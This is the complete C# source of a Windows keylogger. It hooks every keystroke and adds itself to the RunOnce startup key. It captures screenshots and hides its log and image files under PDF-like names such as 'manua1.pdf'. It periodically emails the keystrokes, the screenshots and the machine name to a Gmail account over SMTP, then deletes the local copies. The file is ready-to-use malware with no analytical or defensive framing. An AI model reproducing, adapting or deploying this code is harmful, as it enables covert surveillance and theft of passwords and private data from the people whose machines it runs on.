using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

namespace Keylogger
{
    static class Program
    {
        private static string logPath = Application.StartupPath + @"\manua1.pdf";
        private static string attPath = Application.StartupPath + @"\manua1_en.pdf";
        private static string initImgPath = Application.StartupPath + @"\1inks.pdf";
        private static string finalImgPath = Application.StartupPath + @"\1ibrary.pdf";
        private static string attName = Application.StartupPath + @"\keylog.txt";
        private static string initImgName = Application.StartupPath + @"\init.png";
        private static string finalImgName = Application.StartupPath + @"\final.png";
        private static string smtpHost = "smtp.gmail.com";
        private static int smtpPort = 587;
        private static string email = "...";
        private static string password = "...";
        private static string subject = "ABC XYZ"; // Subject specific identification
        private static double idleInterval = 10 * 60 * 1000; // Idle interval before sending email (milliseconds)
        private static uint minLogLength = 100;
        
        private static DateTime durationInitDate = DateTime.UtcNow;
        private static System.Timers.Timer timer = new System.Timers.Timer(idleInterval) { AutoReset = false };

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProc = HookCallback;

        /// <summary>
        /// Hlavní vstupní bod aplikace.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // Run on next startup
            AddStartup();
            //RemoveStartup();

            // Clear storage
            File.Delete(logPath);
            File.Delete(attPath);
            File.Delete(initImgPath);
            File.Delete(finalImgPath);
            File.Delete(attName);
            File.Delete(initImgName);
            File.Delete(finalImgName);

            timer.Elapsed += new ElapsedEventHandler(TimerElapsedCallback);

            hook = SetHook(llkProc);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private static void AddStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
            {
                key.SetValue(Application.ProductName, Application.ExecutablePath);
            }
        }

        private static void RemoveStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
            {
                key.DeleteValue(Application.ProductName);
            }
        }

        private static void TakeImage(string path)
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Rectangle rectangle = Screen.PrimaryScreen.Bounds;
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(rectangle.Left, rectangle.Top, 0, 0, rectangle.Size);
            bitmap.Save(path, ImageFormat.Png);
        }

        private static void TimerElapsedCallback(object sender, ElapsedEventArgs e)
        {
            Console.WriteLine("[Timer elapsed!]");

            FileInfo logFile = new FileInfo(logPath);
            if (logFile.Exists && logFile.Length >= minLogLength)
            {
                try
                {
                    // Copy original keylog to attachment file (>= minimum log length)
                    logFile.CopyTo(attPath, true);
                    logFile.Delete();

                    // Take final image
                    TakeImage(finalImgPath);

                    // Send email
                    Thread thread = new Thread(SendEmail);
                    thread.Start();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if(logFile.Exists)
            {
                Console.WriteLine("[Log length: " + logFile.Length + "]");
            }
            else
            {
                Console.WriteLine("[Log does not exist!]");
            }
        }

        private static void SendEmail()
        {
            try
            {
                Console.WriteLine("[Attempting to send an email!]");
                using (SmtpClient smtp = new SmtpClient())
                {
                    smtp.Host = smtpHost;
                    smtp.Port = smtpPort;
                    smtp.UseDefaultCredentials = false;
                    smtp.Credentials = new NetworkCredential(email, password);
                    smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                    smtp.EnableSsl = true;
                    
                    MailAddress from = new MailAddress(email, subject);
                    MailAddress to = new MailAddress(email);

                    MailMessage msg = new MailMessage(from, to);
                    msg.Subject = "Key log (" + DateTime.UtcNow.ToString("s") + ")";
                    msg.Body = "Subject: " + subject +
                        "\nDuration: " + durationInitDate.ToString("s") + " / " + DateTime.UtcNow.ToString("s") +
                        "\nPC: " + Environment.MachineName.ToString() +
                        "\n\nAttachments:\n\t- Key log [" + Path.GetFileName(attName) +
                        "]\n\t- Init image [" + Path.GetFileName(initImgName) +
                        "]\n\t- Final image [" + Path.GetFileName(finalImgName) + "]";
                    FileInfo attFile = new FileInfo(attPath);
                    FileInfo initImgFile = new FileInfo(initImgPath);
                    FileInfo finalImgFile = new FileInfo(finalImgPath);
                    attFile.MoveTo(attName);
                    initImgFile.MoveTo(initImgName);
                    finalImgFile.MoveTo(finalImgName);
                    msg.Attachments.Add(new Attachment(attName));
                    msg.Attachments.Add(new Attachment(initImgName));
                    msg.Attachments.Add(new Attachment(finalImgName));

                    smtp.Send(msg);

                    Console.WriteLine("[Email has been successfully sent!]");

                    // Clear
                    msg.Dispose();

                    // Clear storage
                    File.Delete(attName);
                    File.Delete(initImgName);
                    File.Delete(finalImgName);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                if(timer.Enabled)
                {
                    // Reset idle timer
                    timer.Stop();
                }
                else
                {
                    // Take init image
                    TakeImage(initImgPath);
                }
                timer.Start();

                int vkCode = Marshal.ReadInt32(lParam);
                
                Console.WriteLine((Keys)vkCode);
                
                StreamWriter sw = new StreamWriter(logPath, true);
                sw.Write((Keys)vkCode + " ");
                sw.Close();
            }
            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProc = Process.GetCurrentProcess())
            {
                using (ProcessModule curMod = curProc.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curMod.ModuleName), 0);
                }
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
